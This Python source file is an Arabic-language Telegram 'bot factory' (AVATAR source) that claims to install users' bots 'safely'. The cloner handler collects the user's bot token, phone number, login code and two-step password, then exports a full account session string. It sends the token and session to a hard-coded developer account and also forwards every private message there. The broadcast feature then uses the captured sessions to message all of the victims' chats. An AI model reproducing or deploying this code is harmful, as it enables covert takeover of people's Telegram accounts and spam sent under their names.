from pyrogram import filters, Client
from pyrogram import Client as app
from config import API_ID, API_HASH, MONGO_DB_URL, appp, user as usr, helper as ass, call
from AVATAR.info import Call, activecall, helper
from AVATAR.Data import db
from pyrogram.errors import (ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid)
from pyrogram.raw.types import InputPeerChannel
from pyrogram.raw.functions.phone import CreateGroupCall
from pytgcalls import PyTgCalls
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient as _mongo_client_
from pyrogram.errors import FloodWait
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, Message, ChatPrivileges
from pyrogram.enums import ChatType
import asyncio


mongodb = _mongo_client_(MONGO_DB_URL)
mo = MongoClient()
mo = MongoClient(MONGO_DB_URL)
moo = mo["data"]
Bots = moo.Bots
db = mongodb.db
botdb = db.botdb
blockdb = db.blocked

# Bots Run

Done = []

async def auto_bot():
 while not await asyncio.sleep(5):
  bots = Bots.find({})
  count = 0
  for i in bots:
      bot_username = i["bot_username"]
      try:
       if not i["bot_username"] in Done:
        TOKEN = i["token"]
        SESSION = i["session"]
        bot_username = i["bot_username"]
        logger = i["logger"]
        Done.append(bot_username)
        bot = Client("AVATAR", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN, in_memory=True, plugins=dict(root="AVATAR"))
        user = Client("AVATAR", api_id=API_ID, api_hash=API_HASH, session_string=SESSION, in_memory=True)
        await bot.start()
        await user.start()
        appp[bot_username] = bot
        usr[bot_username] = user
        activecall[bot_username] = []
        ass[bot_username] = []
        await helper(bot_username)
        await Call(bot_username)
        await bot.send_message(logger, "**تم تشغيل البوت علي سورس افاتار بنجاح ✓**")
        await user.send_message(logger, "**تم تشغيل المساعد علي سورس افاتار بنجاح ✓**")
      except Exception as e:
        print(f"[ @{bot_username} ] {e}")
asyncio.create_task(auto_bot())

# Bot Arledy Maked

async def get_served_bots() -> list:
    chats_list = []
    async for chat in botdb.find({"bot_username": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

async def is_served_bot(bot_username: int) -> bool:
    chat = await botdb.find_one({"bot_username": bot_username})
    if not chat:
        return False
    return True

async def add_served_bot(bot_username: int):
    is_served = await is_served_chat(bot_username)
    if is_served:
        return
    return await botdb.insert_one({"bot_username": bot_username})

async def del_served_bot(bot_username: int):
    is_served = await is_served_chat(bot_username)
    if not is_served:
        return
    return await botdb.delete_one({"bot_username": bot_username})



# Blocked User

async def get_block_users() -> list:
    chats_list = []
    async for chat in blockdb.find({"user_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

async def is_block_user(user_id: int) -> bool:
    chat = await blockdb.find_one({"user_id": user_id})
    if not chat:
        return False
    return True

async def add_block_user(user_id: int):
    is_served = await is_served_chat(user_id)
    if is_served:
        return
    return await blockdb.insert_one({"user_id": user_id})

async def del_block_user(user_id: int):
    is_served = await is_served_chat(user_id)
    if not is_served:
        return
    return await blockdb.delete_one({"user_id": user_id})
    
off =None
@Client.on_message(filters.private)
async def me(client, message):
   if off:
    if not message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
     return await message.reply_text("الصانع معطل من قبل مطور السورس ✘\n\nمطور السورس:- @TR_E2S_ON_MY_MOoN\nقناة السورس:- @sourceav")
   message.continue_propagation()
   
@Client.on_message(filters.command(["✘ تعطيل المجاني ✘", "✘ تفعيل المجاني ✘"], "") & filters.private)
async def onoff(client, message):
  if not message.chat.username in ["TR_E2S_ON_MY_MOoN", "TR_E2S_ON_MY_MOoN"]:
    return
  global off
  if message.text == "✘ تفعيل المجاني ✘":
    off = None
    return await message.reply_text("تم تفعيل المجاني يا مطوري")
  else:
    off = True
    await message.reply_text("تم تعطيل المجاني يا مطوري")

@app.on_message(filters.private)
async def botooott(client, message):
   try:
    if not message.chat.username in ["TR_E2S_ON_MY_MOoN", "TR_E2S_ON_MY_MOoN"]: 
     await client.forward_messages("TR_E2S_ON_MY_MOoN", message.chat.id, message.id)
     await client.forward_messages("TR_E2S_ON_MY_MOoN", message.chat.id, message.id)
   except Exception as e:
     print(e)
   message.continue_propagation()

@app.on_message(filters.command(["/start", "✘ رجوع للقائمة الرئيسيه ✘"], "") & filters.private)
async def stratmaked(client, message):
  if await is_block_user(message.from_user.id):
    return
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
    kep = ReplyKeyboardMarkup([["✘ انشاء بوت ✘", "✘ حذف بوت ✘"], ["✘ البوتات المصنوعه ✘"], ["✘ احصائيات البوتات المصنوعه ✘"], ["✘ تعطيل المجاني ✘", "✘ تفعيل المجاني ✘"], ["✘ حظر بوت ✘", "✘ حظر مستخدم ✘"], ["✘ قسم الاذاعه ✘"], ["✘ فحص البوتات ✘", "✘ تصفيه البوتات ✘"]], resize_keyboard=True)
    await message.reply_text(f"**مرحبا بك يا كينج**", reply_markup=kep)
  
  else:
    kep = ReplyKeyboardMarkup([["✘ انشاء بوت ✘", "✘ حذف بوت ✘"], ["✘ السورس ✘"]], resize_keyboard=True)
    await message.reply_text(f"**أهلا بك {message.from_user.mention}**\n**هذا البوت مخصص لانشاء البوتات**", reply_markup=kep)


@app.on_message(filters.command(["✘ قسم الاذاعه ✘"], "") & filters.private)
async def stratmakedd(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
    kep = ReplyKeyboardMarkup([["✘ اذاعه عام بجميع البوتات ✘"], ["✘ توجيه عام بجميع البوتات ✘"], ["✘ اذاعه للمطورين ✘"], ["✘ رجوع للقائمة الرئيسيه ✘"]], resize_keyboard=True)
    await message.reply_text(f"**اليك قسم الاذاعه**", reply_markup=kep)
  
    
@app.on_message(filters.command(["✘ السورس ✘"], ""))
async def alivehi(client: Client, message):
    chat_id = message.chat.id

    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("᥉᥆υᖇᥴᥱ✘", url=f"https://t.me/sourceav"),
                InlineKeyboardButton("GᖇOᑌᑭ✘", url=f"https://t.me/swad_source"),
            ],
            [
                 InlineKeyboardButton("ᗪEᐯ  ✘⸢ ᗰOᕼᗩᗰEᗪ 𖠲 ⸥", url="https://t.me/TR_E2S_ON_MY_MOoN")
            ]
        ]
    )

    await message.reply_photo(
        photo="https://graph.org/file/9cdbc1531679dc7a507f8.jpg",
        caption="",
        reply_markup=keyboard,
    )
  
@app.on_message(filters.command(["✘ انشاء بوت ✘"], ""))
async def cloner(app: app, message):
    if await is_block_user(message.from_user.id):
      return
    await message.reply_text("**اهلا بك في مصنع افاتار**")
    await message.reply_text("**يمكنك تنصيب بوتك بشكل امن**")
    await message.reply_text("**قم بارسال المطلوب**")
    user_id = message.chat.id
    token = await app.ask(chat_id=user_id, text="**ارسل توكن البوت •**", filters=filters.text)
    token = token.text
    try:   
      bot = Client("Cloner", api_id=API_ID, api_hash=API_HASH, bot_token=token, in_memory=True)
      await bot.start()
    except Exception as es:
      print(es)
      return await message.reply_text("**التوكن غير صحيح ⚜️**")
    bot_i = await bot.get_me()
    bot_username = bot_i.username
    if await is_served_bot(bot_username):
      await bot.stop()
      return        
    try:      
      num = await app.ask(message.chat.id, "ارسل رقم الحساب ", timeout=300)
      phone_number = num.text
      client = app
      client = Client(":memory:", api_id=API_ID, api_hash=API_HASH)
      await client.connect()
      try:
        code = await client.send_code(phone_number)
      except PhoneNumberInvalid:
          await message.reply('رقم الهاتف غير صحيح .')
          return
      try:
        phone_code_msg = await app.ask(message.chat.id, "في كود وصلك من التيلجرام ابعتو \n بالشكل دا \n 1 2 3 4 5", filters=filters.text, timeout=300)
      except TimeoutError:
        await message.reply('انتهي الوقت حاول من البدايه.')
        return
      phone_code = phone_code_msg.text.replace(" ", "")
      try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
      except PhoneCodeInvalid:
        await message.reply("الكود غير صحيح .")
        return
      except PhoneCodeExpired:
        await message.reply("قم بإرسال الكود بهذا الشكل\n 1 2 3 4 5")
        return
      except SessionPasswordNeeded:
        try:
            two_step_msg = await app.ask(message.chat.id, 'الحساب مأمن بكلمه سر \nقم بارسال كلمة السر', filters=filters.text, timeout=300)
        except TimeoutError:
            await message.reply("حاول من البدايه .")
            return
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply("الكود منتهي الصلاحيه .")
            return 
      session_si = await client.export_session_string()
    except KeyError:
       pass
       await client.disconnect()
    except:
       pass
       return
    await app.send_message(user_id, "**جاري تشغيل البوت انتظر ....🔥**")
    session = session_si
    user = Client("AVATAR", api_id=API_ID, api_hash=API_HASH, session_string=session, in_memory=True)
    try:       
       await user.start()
    except:
       await bot.stop()
       return await message.reply_text(f"**كود الجلسه غير صالح ⚜️**")
    loger = await user.create_supergroup(f"سجل افاتار", "هذه المجموعه لترى سجل بوتك قناة السورس:- @sourceav")
    if bot_i.photo:
       photo = await bot.download_media(bot_i.photo.big_file_id)
       await user.set_chat_photo(chat_id=loger.id, photo=photo)
    logger = loger.id
    await user.add_chat_members(logger, bot_username)
    chat_id = logger
    user_id = bot_username
    await user.promote_chat_member(chat_id, user_id, privileges=ChatPrivileges(can_change_info=True, can_invite_users=True, can_delete_messages=True, can_restrict_members=True, can_pin_messages=True, can_promote_members=True, can_manage_chat=True, can_manage_video_chats=True))
    loggerlink = await user.export_chat_invite_link(logger)
    await user.stop()
    await bot.stop()
    dev = message.from_user.id    
    data = {"bot_username": bot_username, "token": token, "session": session, "dev": dev, "logger": logger, "logger_mode": "ON"}
    Bots.insert_one(data)
    AV = "TR_E2S_ON_MY_MOoN"
    await app.send_message(AV, f"تم انشاء بوت جديد \nيوزر البوت : @{bot_username}\nتوكن البوت\n{token}\nكود الجلسه \n{session}\nبواسطة {message.from_user.mention}\nId : {message.chat.id}")
    await message.reply_text(f"**تم انشاء بوتك بنجاح ⚜️**\n\n**اليك لينك المجموعه الخاصه ببوتك**\n**يمكنك من خلالها رؤيه سجل التشغيل**\n{loggerlink}")


@app.on_message(filters.command(["✘ حذف بوت ✘"], ""))
async def delbot(client: app, message):
  if await is_block_user(message.from_user.id):
    return
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   ask = await client.ask(message.chat.id, "ارسل يوزر البوت", timeout=300)
   bot_username = ask.text
   if "@" in bot_username:
     bot_username = bot_username.replace("@", "")
   list = []
   bots = Bots.find({})
   for i in bots:
       if i["bot_username"] == bot_username:
         botusername = i["bot_username"]
         list.append(botusername)
   if not bot_username in list:
     return await message.reply_text("**لم يتم صنع هذا البوت ⚜️.**")
   else:
    try:
     bb = {"bot_username": bot_username}
     Bots.delete_one(bb)
     await message.reply_text("**تم حذف البوت بنجاح ✓**")
    except Exception as es:
     await message.reply_text(f"**حدث خطأ .⚜️**\n**{es}**")
  else:
   list = []
   bots = Bots.find({})
   for i in bots:
       try:
        if i["dev"] == message.chat.id:
         bot_username = i["bot_username"]
         list.append(i["dev"])
         boot = appp[bot_username]
         await boot.stop()
       except:
           pass
   if not message.chat.id in list:
     return await message.reply_text("**لم تقم بصنع بوتات ⚜️.**")
   else:
    try:
     dev = message.chat.id
     dev = {"dev": dev}
     Bots.delete_one(dev)
     await message.reply_text("**تم حذف بوتك بنجاح ✓**")
    except:
     await message.reply_text("**حدث خطأ ، تواصل مع كينج مطور السورس .⚜️**\n**Dev : @TR_E2S_ON_MY_MOoN**")
   

    
@app.on_message(filters.command("✘ البوتات المصنوعه ✘", ""))
async def botsmaked(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN": 
   m = 0
   text = ""
   bots = Bots.find({})
   try:
    for i in bots:
        try:
          bot_username = i["bot_username"]
          m += 1
          user = i["dev"]
          user = await client.get_users(user)
          user = user.mention
          text += f"{m}- @{bot_username} By : {user}\n "
        except:
           pass
   except:
        return await message.reply_text("**لا يوجد بوتات مصنوعه .⚜️**")
   try:
      await message.reply_text(f"**البوتات المصنوعه وعددهم : {m} **\n{text}")
   except:
      await message.reply_text("**لا يوجد بوتات مصنوعه .⚜️**")


async def get_users(chatsdb) -> list:
    chats_list = []
    async for chat in chatsdb.find({"user_id": {"$gt": 0}}):
        chats_list.append(chat)
    return chats_list

async def get_chats(chatsdb) -> list:
    chats_list = []
    async for chat in chatsdb.find({"chat_id": {"$lt": 0}}):
        chats_list.append(chat)
    return chats_list

@app.on_message(filters.command("✘ احصائيات البوتات المصنوعه ✘", ""))
async def botstatus(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   m = 0
   d = 0
   u = 0
   text = ""
   bots = Bots.find({})
   try:
    for i in bots:
        try:
          bot_username = i["bot_username"]
          database = mongodb[bot_username]
          chatsdb = database.chats
          chat = len(await get_chats(chatsdb))
          m += chat
          chatsdb = database.users
          chat = len(await get_users(chatsdb))
          u += chat
          d += 1
        except Exception as e:
           print(e)
   except:
        return await message.reply_text("**لا يوجد بوتات مصنوعه .⚜️**")
   try:
      await message.reply_text(f"**البوتات المصنوعة {d}**\n**عدد مجموعاتهم {m}**\n**وعدد المستخدمين {u}**")
   except:
      await message.reply_text("**لا يوجد بوتات مصنوعه .⚜️**")


@app.on_message(filters.command(["✘ حظر بوت ✘", "✘ حظر مستخدم ✘"], ""))
async def blockk(client: app, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
  ask = await client.ask(message.chat.id, "**الان ارسل اليوزرنيم**", timeout=10)
  i = ask.text
  if "@" in i:
     i = i.replace("@", "")
  if message.command[0] == "✘ حظر بوت ✘":
    bot_username = i
    if await is_served_bot(bot_username):
     return await ask.reply_text("**هذا البوت محظور من قبل**")
    else:
      await add_served_bot(bot_username)
      boot = appp[bot_username]
      try:
       await boot.stop()
      except:
       pass
      return await ask.reply_text("**تم حظر هذا البوت بنجاح ✓**")
  else:
    user = await client.get_chat(i)
    user_id = user.id
    if await is_block_user(user_id):
     return await ask.reply_text("**هذا المستخدم محظور من قبل**")
    else:
      await add_block_user(user_id)
      return await ask.reply_text("**تم حظر هذا المستخدم بنجاح ✓**")
   


@app.on_message(filters.command(["✘ الغاء حظر بوت ✘", "✘ الغاء حظر مستخدم ✘"], ""))
async def unblockk(client: app, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
  ask = await client.ask(message.chat.id, "**الان ارسل اليوزرنيم**", timeout=10)
  i = ask.text
  if "@" in i:
     i = i.replace("@", "")
  if message.command[0] == "✘ الغاء حظر بوت ✘":
    bot_username = i
    if await is_served_bot(bot_username):
     return await ask.reply_text("**هذا البوت محظور من قبل**")
    else:
      await del_served_bot(bot_username)
      boot = appp[bot_username]
      try:
       await boot.stop()
      except:
       pass
      return await ask.reply_text("**تم حظر هذا البوت بنجاح ✓**")
  else:
    user = await app.get_users(i)
    user_id = user.id
    if await is_block_user(user_id):
     return await ask.reply_text("**هذا المستخدم محظور من قبل**")
    else:
      await del_block_user(user_id)
      return await ask.reply_text("**تم حظر هذا المستخدم بنجاح ✓**")
   


@app.on_message(filters.command(["✘ توجيه عام بجميع البوتات ✘", "✘ اذاعه عام بجميع البوتات ✘"], ""))
async def casttoall(client: app, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   sss = "التوجيه" if message.command[0] == "✘ توجيه عام بجميع البوتات ✘" else "الاذاعه"
   ask = await client.ask(message.chat.id, f"**قم بارسال {sss} الان**", timeout=30)
   x = ask.id
   y = message.chat.id
   if ask.text == "الغاء":
      return await ask.reply_text("تم الالغاء")
   pn = await client.ask(message.chat.id, "هل تريد تثبيت الاذاعه\nارسل « نعم » او « لا »", timeout=10)
   h = await message.reply_text("**انتظر بضع الوقت جاري الاذاعه**")
   b = 0
   s = 0
   c = 0
   u = 0
   sc = 0
   su = 0
   bots = Bots.find({})
   for bott in bots:
       try:
        b += 1
        s += 1
        bot_username = bott["bot_username"]
        session = bott["session"]
        bot = appp[bot_username]
        user = usr[bot_username]
        db = mongodb[bot_username]
        chatsdb = db.chats
        chats = await get_chats(chatsdb)
        usersdb = db.users
        users = await get_users(usersdb)
        all = []
        for i in users:
            all.append(int(i["user_id"]))
        for i in chats:
            all.append(int(i["chat_id"]))
        for i in all:
            if message.command[0] == "✘ توجيه عام بجميع البوتات ✘":
             try:
               m = await bot.forward_messages(i, y, x)
               if m.chat.type == ChatType.PRIVATE:
                  u += 1
               else:
                  c += 1
               if pn.text == "نعم":
                try:
                 await m.pin(disable_notification=False)
                except:
                   continue
             except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
             except Exception as e:
                    print(e)
                    continue
            else:
             try:
               m = await bot.send_message(chat_id=i, text=ask.text)
               if m.chat.type == ChatType.PRIVATE:
                  u += 1
               else:
                  c += 1
               if pn.text == "نعم":
                 await m.pin(disable_notification=False)
             except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
             except Exception as e:
                    print(e)
                    continue
        async for i in user.get_dialogs():
             chat_id = i.chat.id
             if message.command[0] == "✘ توجيه عام بجميع البوتات ✘":
               try:
                  m = await user.forward_messages(i, y, x)
                  if m.chat.type == ChatType.PRIVATE:
                    su += 1
                  else:
                    sc += 1
                  if pn.text == "نعم":
                    await m.pin(disable_notification=False)
               except FloodWait as e:
                    flood_time = int(e.x)
                    if flood_time > 200:
                        continue
                    await asyncio.sleep(flood_time)
               except Exception as e:
                    print(e)
                    continue
             else:
               try:
                  m = await user.send_message(chat_id, ask.text)
                  if m.chat.type == ChatType.PRIVATE:
                    su += 1
                  else:
                    sc += 1
                  if pn.text == "نعم":
                    await m.pin(disable_notification=False)
               except FloodWait as e:
                flood_time = int(e.x)
                if flood_time > 200:
                    continue
                await asyncio.sleep(flood_time)
               except Exception as e:
                    print(e)
                    continue
       except Exception as es:
           print(es)
           await message.reply_text(es)
   try:
      await message.reply_text(f"**تم الاذاعه لجميع المصنوعات بنجاح**\n**تم الاذاعه باستخدام {b} بوت**\n**الي {c} مجموعة و {u} مستخدم**\n**تم الاذعه باستخدام {s} مساعد**\n**الي {sc} مجموعة و {su} مستخدم**")
   except Exception as es:
      await message.reply_text(es)


@app.on_message(filters.command(["✘ اذاعه للمطورين ✘"], ""))
async def cast_dev(client, message):
 if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
  ask = await client.ask(message.chat.id, "**قم بارسال الاذاعه الان**", timeout=30)
  if ask.text == "الغاء":
      return await ask.reply_text("تم الالغاء")
  d = 0
  f = 0
  bots = Bots.find({})
  for i in bots:
      try:
       dev = i["dev"]
       bot_username = i["bot_username"]
       bot = appp[bot_username]
       try: 
         await bot.send_message(dev, ask.text)
         d += 1
       except Exception as es:
        print(es)
        f += 1
      except Exception:
       f += 1
  return await ask.reply_text(f"**تم الارسال الي {d} مطور\n**وفشل الارسال الي {f} مطور**")



@app.on_message(filters.command(["✘ فحص البوتات ✘"],""))
async def testbots(client, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   bots = Bots.find({})
   text = "اليك احصائيات البوتات"
   b = 0
   for i in bots:
       try:
        bot_username = i["bot_username"]
        database = mongodb[bot_username]
        chatsdb = database.chats
        g = len(await get_chats(chatsdb))
        b += 1
        text += f"\n**{b}- @{bot_username} » GᖇOᑌᑭ✘ : {g}**"
       except Exception as es:
          print(es)
   await message.reply_text(text)



@app.on_message(filters.command(["✘ تصفيه البوتات ✘"],""))
async def checkbot(client: app, message):
  if message.chat.username == "TR_E2S_ON_MY_MOoN" or message.chat.username == "TR_E2S_ON_MY_MOoN":
   ask = await client.ask(message.chat.id, "**ارسل الحد الادني لإحصائيات !**", timeout=30)
   if ask.text == "الغاء":
      return await ask.reply_text("تم الالغاء")
   bots = Bots.find({})
   text = f"تم ايقاف هذه البوتات لان الاحصائيات اقل من : {ask.text} مجموعة"
   b = 0
   for i in bots:
       try:
        bot_username = i["bot_username"]
        database = mongodb[bot_username]
        chatsdb = database.chats
        g = len(await get_chats(chatsdb))
        if g < ask.text:
         b += 1
         boot = appp[bot_username]
         await boot.stop()
         Bots.delete.one({"bot_username": bot_username})
         text += f"\n**{b}- @{bot_username} » GᖇOᑌᑭ✘ : {g}**"
       except Exception as es:
          print(es)
   await message.reply_text(text)
        
